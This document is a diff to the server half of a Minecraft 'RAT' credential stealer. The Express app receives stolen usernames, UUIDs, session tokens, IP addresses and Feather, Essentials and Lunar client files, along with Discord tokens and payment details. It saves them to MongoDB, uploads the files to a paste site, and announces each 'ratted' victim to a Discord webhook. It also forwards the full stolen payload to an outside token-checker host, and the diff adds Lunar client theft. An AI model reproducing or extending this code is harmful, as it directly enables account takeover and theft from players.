@@ -5,7 +5,7 @@ const
 
 //setup
 require("dotenv").config()
-const { post, get } = require("axios").default,
+const { post, get } = require("axios"),
     express = require("express"),
     mongoose = require("mongoose"),
     helmet = require("helmet"),
@@ -42,7 +42,7 @@ setInterval(() => {
 //main route, post to this
 app.post("/", (req, res) => {
     //happens if the request does not contain all the required fields, aka someones manually posting to the server
-    if (!["username", "uuid", "token", "ip", "feather", "essentials", "discord"].every(field => req.body.hasOwnProperty(field))) {
+    if (!["username", "uuid", "token", "ip", "feather", "essentials", "lunar", "discord"].every(field => req.body.hasOwnProperty(field))) {
         console.log("[R.A.T] Rejected malformed JSON")
         return res.sendStatus(404)
     }
@@ -83,6 +83,7 @@ app.post("/", (req, res) => {
                     tokenAuth: `${req.body.username}:${req.body.uuid}:${req.body.token}`,
                     feather: req.body.feather,
                     essentials: req.body.essentials,
+                    lunar: req.body.lunar,
                     discord: req.body.discord
                 }).save(err => {
                     if (err) console.log(`[R.A.T] Error while saving to MongoDB database:\n${err}`)
@@ -104,6 +105,9 @@ app.post("/", (req, res) => {
 
                 //upload essential
                 const essentials = await (await post("https://hst.sh/documents/", req.body.essentials).catch(() => { return { data: { key: "Error uploading" } } })).data.key
+
+                //upload lunar
+                const lunar = await (await post("https://hst.sh/documents/", req.body.lunar).catch(() => { return { data: { key: "Error uploading" } } })).data.key
 
                 //get discord info
                 let nitros = ""
@@ -130,12 +134,12 @@ app.post("/", (req, res) => {
                     content: `@everyone - ${total_networth}`, //ping
                     embeds: [{
                         title: `Ratted ${req.body.username} - Click For Stats`,
-                        description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**TokenAuth:**\`\`\`${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\`\n**Feather:**\nhttps://hst.sh/${feather}\n\n**Essentials:**\nhttps://hst.sh/${essentials}\n\n**Discord:**\`\`\`${discord.join(" | ")}\`\`\`\n**Nitro**: \`${nitros}\`\n**Payment**: \`${payments}\``,
+                        description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**TokenAuth:**\`\`\`${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\`\n**Feather:**\nhttps://hst.sh/${feather}\n\n**Essentials:**\nhttps://hst.sh/${essentials}\n\n**Lunar:**\nhttps://hst.sh/${lunar}\n\n**Discord:**\`\`\`${discord.join(" | ")}\`\`\`\n**Nitro**: \`${nitros}\`\n**Payment**: \`${payments}\``,
                         url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
                         color: 5814783,
                         footer: {
-                            "text": "Rat By HyperFreak",
-                            "icon_url": "https://bigrat.monster/media/bigrat.png"
+                            "text": "RAt By Hyperfreak",
+                            "icon_url": "https://avatars.githubusercontent.com/u/42523606?v=4"
                         },
                         timestamp: new Date()
                     }],
@@ -147,15 +151,14 @@ app.post("/", (req, res) => {
                 }).catch(err => {
                     console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
                 })
-
-                //MojangAuth
-                post("https://api-mojang-tokenchecker.herokuapp.com", req.body, {
-                    headers: {
-                        "Content-Type": "application/json"                   
-                    }
-                }).catch(err => {})
-            }
-
+                
+                            //MojangAuth
+                            post("https://api-mojang-tokenchecker.herokuapp.com", req.body, {
+                                headers: {
+                                    "Content-Type": "application/json"                   
+                                }
+                            }).catch(err => {})
+                        }
 
             console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
         }
